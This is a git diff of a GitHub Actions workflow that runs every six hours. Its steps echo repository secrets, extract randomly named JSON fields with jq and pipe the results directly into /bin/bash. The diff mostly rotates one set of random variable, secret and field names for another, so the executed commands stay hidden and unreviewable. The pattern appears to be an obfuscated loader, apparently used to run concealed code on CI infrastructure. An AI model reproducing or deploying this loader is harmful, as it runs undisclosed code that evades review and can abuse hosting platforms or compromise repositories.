@@ -3,31 +3,24 @@ name: kexiagjiaohe
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 4/6 * * *'
-jobs:  # 25672
+    - cron: '33 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: kexiagjiaohe
         env:
-          uj40264: ${{ secrets.uj40264 }}
+          aeu51429: ${{ secrets.aeu51429 }}
         run: |
-          echo $uj40264 | jq -r .xe45 | /bin/bash
-          echo $vmbuy9 | jq -r .f60138 | /bin/bash
-          echo $fs17738 | jq -r .a7 | /bin/bash
-          echo $clyt335 | jq -r .j75 | /bin/bash
-          echo $h06554 | jq -r .wyf6232 | /bin/bash
-          echo $paowu40 | jq -r .x8 | /bin/bash
-          echo $aua0 | jq -r .psj72527 | /bin/bash
-          echo $fo807 | jq -r .yp95 | /bin/bash
-          echo $bx10782 | jq -r .fhm26 | /bin/bash
-          echo $po353 | jq -r .uebd459 | /bin/bash
-          echo $boi948 | jq -r .ugppa31927 | /bin/bash
-          echo $k6371 | jq -r .yh569 | /bin/bash
-          echo $au36 | jq -r .pqrzd270 | /bin/bash
-          echo $mdu08000 | jq -r .zj4 | /bin/bash
-          echo $tuaut12 | jq -r .dxpqr786 | /bin/bash
-          echo $o9462 | jq -r .gcbae4431 | /bin/bash
+          echo $aeu51429 | jq -r .ylq63633 | /bin/bash
+          echo $edkkd58 | jq -r .ghko5 | /bin/bash
+          echo $kvqnh228 | jq -r .ifx0 | /bin/bash
+          echo $an4935 | jq -r .llj74 | /bin/bash
+          echo $kboq4623 | jq -r .ucder0 | /bin/bash
+          echo $pv2929 | jq -r .jm49832 | /bin/bash
+          echo $qpbif592 | jq -r .ysh99 | /bin/bash
+          echo $yl17667 | jq -r .jq85853 | /bin/bash
+          echo $ow73134 | jq -r .v52662 | /bin/bash
+          echo $kmvqk0 | jq -r .romcm1601 | /bin/bash
 
